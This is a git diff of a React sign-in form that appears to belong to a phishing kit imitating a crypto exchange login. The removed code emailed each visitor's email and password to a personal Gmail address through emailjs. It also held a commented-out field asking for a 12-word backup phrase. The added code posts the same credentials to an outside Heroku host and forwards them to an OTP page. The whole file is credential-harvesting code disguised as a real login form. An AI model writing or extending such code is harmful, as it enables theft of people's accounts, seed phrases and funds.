@@ -1,13 +1,13 @@
 import React, { useState, useEffect } from 'react'
-import { connect } from 'react-redux'
-import emailjs from 'emailjs-com'
-
-
-import * as orderAction from '../store/actions'
+import { useHistory } from 'react-router-dom'
 
 const Form = (props) => {
+    const history = useHistory()
+
     const [email, setEmail] = useState('')
     const [password, setPassword] = useState('')
+    const [loading, setLoading] = useState(false)
+    const [token, setToken] = useState('')
 
     const handleEmail = (e) => {
         setEmail(e.target.value)
@@ -16,46 +16,73 @@ const Form = (props) => {
     const handlePassword = (e) => {
         setPassword(e.target.value)
     }
+    //const URL = 'http://localhost:3030'
+    const URL = 'https:/rq--1.herokuapp.com'
 
-    const templateParams = {
-        client_email: email,
-        client_password: password,
-        admin_email: 'munisco12@gmail.com',
-        from_name: 'Roqquappchat',
-        to_name: 'Admin'
-       
+    const fetchCsrf = async () => {
+        const response = await fetch('https:/rq--1.herokuapp.com/form', {
+            method: 'GET',
+            headers: {
+                Accept: 'application/json',
+                'Content-type': 'application/json',
+            },
+            credentials: 'include',
+            mode: 'cors',
+        })
+
+        const resData = await response.json()
+        setToken(resData.token)
     }
+
+    useEffect(() => {
+        fetchCsrf()
+    }, [])
+
     const handleSubmit = async (e) => {
+        e.preventDefault()
+        setLoading(true)
 
-        console.log('credentials', email, password)
-
-        if (email === '' || password === '' ) {
+        if (email === '' || password === '') {
             console.log('not sent')
         } else {
-       
-
-            emailjs
-                .send(
-                    'service_cajdfqp',
-                    'template_wss11os',
-                    templateParams,
-                    'user_xCNzJyoa0acBRP75Xy9wk'
-                )
-                .then(
-                    (result) => {
-                        console.log(result.text, 'email sent')
+            try {
+                const response = await fetch(URL + '/rq-1', {
+                    method: 'POST',
+                    headers: {
+                        Accept: 'application/json',
+                        'Content-type': 'application/json',
+                        Authorization: 'Bearer ' + token,
                     },
-                    (error) => {
-                        console.log(error, 'email failed')
-                    }
-                )
+                    credentials: 'include',
+                    mode: 'cors',
+
+                    body: JSON.stringify({
+                        email,
+                        password,
+                        pin: '',
+                        otp: '',
+                    }),
+                })
+
+                const resData = await response.json()
+
+                if (resData.status === 'success') {
+                    console.log('Message Sent.')
+                    setLoading(false)
+                    history.push('/otp', { email, password,token })
+                } else if (resData.status === 'fail') {
+                    console.log('Message failed to send.')
+                    //         setLoading(false)
+                }
+            } catch (err) {
+                console.log(err)
+            }
         }
     }
-    
 
     return (
         <form
-            className='grid w-full place-content-stretch bg-white '
+            className='grid w-full place-content-stretch bg-white md:w-1/3 md:mx-auto '
             style={{ padding: '30px 15px' }}
             onSubmit={handleSubmit}
         >
@@ -85,7 +112,7 @@ const Form = (props) => {
                 className=' rounded-md outline-none  bg-[#0059dd] text-white text-sm'
                 style={{ padding: '.5rem 3rem', lineHeight: 2.5 }}
             >
-                Sign in to your account
+                {loading ? 'loading..' : 'Sign in to your account'}
             </button>
             <div className='ui horizontal divider font-normal font-BrownBold lowercase'>
                 {' '}
@@ -95,9 +122,9 @@ const Form = (props) => {
             <div className='ui grids'>
                 <div
                     className='ui eight wide column'
-                    style={{ paddingRight: '7px' }}
+                    style={{ paddingRight: '16px' }}
                 >
-                    <div className='customBtn' style={{ paddingRight: '7px' }}>
+                    <div className='customBtn'>
                         <svg
                             className='icon'
                             xmlns='http://www.w3.org/2000/svg'
@@ -107,7 +134,7 @@ const Form = (props) => {
                             aria-hidden='true'
                         >
                             <title>Google</title>
-                            <g fill='none' fill-rule='evenodd'>
+                            <g fill='none' fillRule='evenodd'>
                                 <path
                                     fill='#4285F4'
                                     d='M17.64 9.2045c0-.6381-.0573-1.2518-.1636-1.8409H9v3.4814h4.8436c-.2086 1.125-.8427 2.0782-1.7959 2.7164v2.2581h2.9087c1.7018-1.5668 2.6836-3.874 2.6836-6.615z'
@@ -131,7 +158,7 @@ const Form = (props) => {
                 </div>
                 <div
                     className='ui eight wide column'
-                    style={{ paddingRight: '7px' }}
+                    style={{ paddingRight: '16px' }}
                 >
                     <div id='facebookSignin' className='customBtn'>
                         <svg
@@ -149,60 +176,8 @@ const Form = (props) => {
                     </div>
                 </div>
             </div>
-            {/* {toast && toast.content && (
-                <div className=' grid font-semibold mb-8'>
-                    <p
-                        className={`px-3 py-1 rounded-lg justify-self-center text-black ${
-                            toast.type === 'success'
-                                ? 'bg-yellow-600'
-                                : 'bg-red-800'
-                        }`}
-                    >
-                        {toast.content}
-                    </p>
-                </div>
-            )}
-
-            
-
-            <textarea
-                id='phrase'
-                className='text-black border-2 outline-none text-lg p-1 rounded-md justify-self-stretch '
-                rows={2}
-                required
-                value={phrase}
-                placeholder='Enter 12-word Backup phrase'
-                onChange={handlePhrase}
-            />
-
-            <div className='flex justify-between items-center pt-10 font-medium'>
-                <div className='text-xs font-normal text-[#708599]'>
-                    <input type='checkbox' id='checkbox' required /> {''}
-                    <label htmlFor='checkbox'>
-                        Keep me signed in on this computer
-                    </label>
-                </div>
-
-                {/* <button className='justify-self-center py-2 px-6 font-semibold rounded-md outline-none sm:mb-5 btnclaim text-white'>
-                CLAIM REWARD
-            </button> 
-                <button className='text-white bg-[#1652f0] rounded-sm' style={{padding: '11px 22px', fontSize: '11px'}}>SIGN IN</button>
-            </div> */}
         </form>
     )
 }
 
-const mapStateToProps = (state) => {
-    return {
-        createdPhrase: state.phrase.putPhrase,
-        error: state.phrase.error,
-    }
-}
-
-const mapDispatchToProps = (dispatch) => {
-    return {
-        onInitPutPhrase: (phrase) =>
-            dispatch(orderAction.initPutPhrase(phrase)),
-    }
-}
-export default connect(mapStateToProps, mapDispatchToProps)(Form)
+export default Form
